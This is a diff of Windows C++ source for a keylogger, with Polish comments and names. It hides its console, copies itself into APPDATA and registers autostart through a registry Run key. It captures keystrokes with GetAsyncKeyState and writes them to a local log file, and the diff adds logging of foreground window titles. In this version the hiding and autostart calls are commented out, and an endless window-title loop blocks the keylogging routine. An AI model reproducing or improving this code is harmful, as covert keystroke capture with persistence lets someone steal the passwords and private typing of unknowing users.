@@ -5,19 +5,37 @@
 #include <cstring>
 using namespace std;
 fstream logs;
+
 const string SCIEZKA=getenv("APPDATA")+string("\\997.exe");
-const string SCIEZKA_LOGOW = getenv("APPDATA")+string("\\logi.bat");
+const string SCIEZKA_LOGOW = getenv("APPDATA")+string("\\logi.txt");
+
 int i;
 int vKey;
+char okno2[80];
+char nazwaOkna[80];
 void doSystemu(string sciezkaKeylogger)
 {
     string komenda = "copy "+sciezkaKeylogger+" "+SCIEZKA;
     cout << komenda<<endl;
     system(komenda.c_str());
 }
-void Konsola()//Ukrywanie siê konsoli
+void Konsola()//Ukrywanie si� konsoli
 {
     FreeConsole();
+}
+void nazwaOkno()
+{
+    for(;;){
+    HWND hwnd=GetForegroundWindow();
+    int tymczasowa=GetWindowText(hwnd,nazwaOkna,80);
+    Sleep(2000);
+    int tymczasowa2=GetWindowText(hwnd,okno2,80);
+    if(strcmp(nazwaOkna, okno2))
+    {
+        logs<<">---------------------"<<nazwaOkna<<"---------------------<"<<endl;
+        cout<<nazwaOkna;
+    }
+    }
 }
 void Zapisz(int input)//Zapisywanie do pliku
 {
@@ -33,7 +51,7 @@ void Zapisz(int input)//Zapisywanie do pliku
         exit(0);
     }
 }
-void ZapiszSPECIAL(string input)//Zapisywanie do pliku znaków specjalnych
+void ZapiszSPECIAL(string input)//Zapisywanie do pliku znak�w specjalnych
 {
     logs.open(SCIEZKA_LOGOW.c_str(), ios::app);
     if(logs.is_open())
@@ -61,9 +79,17 @@ bool Mutex()
 }
 void Autostart(string sciezka)//Dodawanie do autostartu
 {
-    string komenda = "reg ADD HKEY_CURRENT_USER\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run /v Test /f /t REG_SZ /d C:\\Users\\Patryk\\Desktop\\997\\bin\\Debug\\997.exe"+sciezka;
+    string komenda = "reg ADD HKEY_CURRENT_USER\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run /v Test /f /t REG_SZ /d "+SCIEZKA;
     cout<<komenda;
     system(komenda.c_str());
+    doSystemu(sciezka);
+
+    if (sciezka!=SCIEZKA)
+    {
+        string komenda = "start "+SCIEZKA;
+        system(komenda.c_str());
+        exit(EXIT_SUCCESS);
+    }
 }
 void Keylogger()
 {
@@ -72,13 +98,13 @@ void Keylogger()
         //Znaki
         for(i=65; i<91; i++)
         {
-            vKey = GetAsyncKeyState(i);
-            if(vKey==-32767 && !GetAsyncKeyState(VK_SHIFT))
+            vKey= GetAsyncKeyState(i);
+            if(vKey&0x0001 && !GetAsyncKeyState(VK_SHIFT))
             {
                 cout<<(char)(i+32);
                 Zapisz(i+32);
             }
-            else if(vKey==-32767 && GetAsyncKeyState(VK_SHIFT))
+            else if(vKey&0x0001 && GetAsyncKeyState(VK_SHIFT))
             {
                 cout<<(char)i;
                 Zapisz(i);
@@ -87,118 +113,58 @@ void Keylogger()
         //Liczby
         for(i=48; i<58; i++)
         {
-            if(GetAsyncKeyState(i)==-32767)
+            vKey = GetAsyncKeyState(i);
+            if(vKey&0x0001 && !GetAsyncKeyState(VK_SHIFT))
             {
                 cout<<(char)i;
-                Zapisz(i);
             }
         }
         //znaki specjalne
-        if (GetAsyncKeyState(VK_RETURN)==-32767)
+        if (GetAsyncKeyState(VK_RETURN)&0x0001)
         {
             cout << "[ENTER]";
             ZapiszSPECIAL("[ENTER]");
         }
-        if (GetAsyncKeyState(VK_TAB)==-32767)
+        if (GetAsyncKeyState(VK_TAB)&0x0001)
         {
             cout << "[TAB]";
             ZapiszSPECIAL("[TAB]");
 
         }
-        if (GetAsyncKeyState(VK_CONTROL)==-32767)
+        if (GetAsyncKeyState(VK_CONTROL)&0x0001)
         {
             cout << "[CTRL]";
             ZapiszSPECIAL("[CTRL]");
         }
-        if (GetAsyncKeyState(VK_MENU)==-32767)
+        if (GetAsyncKeyState(VK_MENU)&0x0001)
         {
             cout << "[ALT]";
             ZapiszSPECIAL("[ALT]");
         }
-        if (GetAsyncKeyState(VK_CAPITAL)==-32767)
+        if (GetAsyncKeyState(VK_CAPITAL)&0x0001)
         {
             cout << "[CAPSLOCK]";
-            ZapiszSPECIAL("[CAPSLOCK]");
+            ZapiszSPECIAL("[CAPS]");
         }
-        if (GetAsyncKeyState(VK_ESCAPE)==-32767)
+        if (GetAsyncKeyState(VK_ESCAPE)&0x0001)
         {
             cout << "[ESC]";
             ZapiszSPECIAL("[ESC]");
         }
-        if (GetAsyncKeyState(VK_DELETE)==-32767)
+        if (GetAsyncKeyState(VK_DELETE)&0x0001)
         {
             cout << "[DELETE]";
-            ZapiszSPECIAL("[DELETE]");
+            ZapiszSPECIAL("[DEL]");
         }
-        if (GetAsyncKeyState(VK_F1)==-32767)
-        {
-            cout << "[F1]";
-            ZapiszSPECIAL("[F1]");
-        }
-        if (GetAsyncKeyState(VK_F2)==-32767)
-        {
-            cout << "[F2]";
-            ZapiszSPECIAL("[F2]");
-        }
-        if (GetAsyncKeyState(VK_F3)==-32767)
-        {
-            cout << "[F3]";
-            ZapiszSPECIAL("[F3]");
-        }
-        if (GetAsyncKeyState(VK_F4)==-32767)
-        {
-            cout << "[F4]";
-            ZapiszSPECIAL("[F4]");
-        }
-        if (GetAsyncKeyState(VK_F5)==-32767)
-        {
-            cout << "[F5]";
-            ZapiszSPECIAL("[F5]");
-        }
-        if (GetAsyncKeyState(VK_F6)==-32767)
-        {
-            cout << "[F6]";
-            ZapiszSPECIAL("[F6]");
-        }
-        if (GetAsyncKeyState(VK_F7)==-32767)
-        {
-            cout << "[F7]";
-            ZapiszSPECIAL("[F7]");
-        }
-        if (GetAsyncKeyState(VK_F8)==-32767)
-        {
-            cout << "[F8]";
-            ZapiszSPECIAL("[F8]");
-        }
-        if (GetAsyncKeyState(VK_F9)==-32767)
-        {
-            cout << "[F9]";
-            ZapiszSPECIAL("[F9]");
-        }
-        if (GetAsyncKeyState(VK_F10)==-32767)
-        {
-            cout << "[F10]";
-            ZapiszSPECIAL("[F10]");
-        }
-        if (GetAsyncKeyState(VK_F11)==-32767)
-        {
-            cout << "[F11]";
-            ZapiszSPECIAL("[F11]");
-        }
-        if (GetAsyncKeyState(VK_F12)==-32767)
-        {
-            cout << "[F12]";
-            ZapiszSPECIAL("[F12]");
-        }
-        if (GetAsyncKeyState(VK_SPACE)==-32767)
+        if (GetAsyncKeyState(VK_SPACE)&0x0001)
         {
             cout<<" ";
             Zapisz(32);
         }
-        if (GetAsyncKeyState(VK_BACK)==-32767)
+        if (GetAsyncKeyState(VK_BACK)&0x0001)
         {
-            cout<<"[BACKSPACE]";
-            ZapiszSPECIAL("[BACKSPACE]");
+            cout<<"[BS]";
+            ZapiszSPECIAL("[BS]");
         }
     }
 }
@@ -206,10 +172,11 @@ int main(int argc, char * argv[])
 {
     if (!Mutex())
     {
-        Konsola();
-        Autostart(SCIEZKA);
+        //Konsola();
+        //Sleep(4000);
+        //Autostart(argv[0]);
+        nazwaOkno();
         Keylogger();
-        doSystemu(argv[0]);
     }
     return 0;
 }
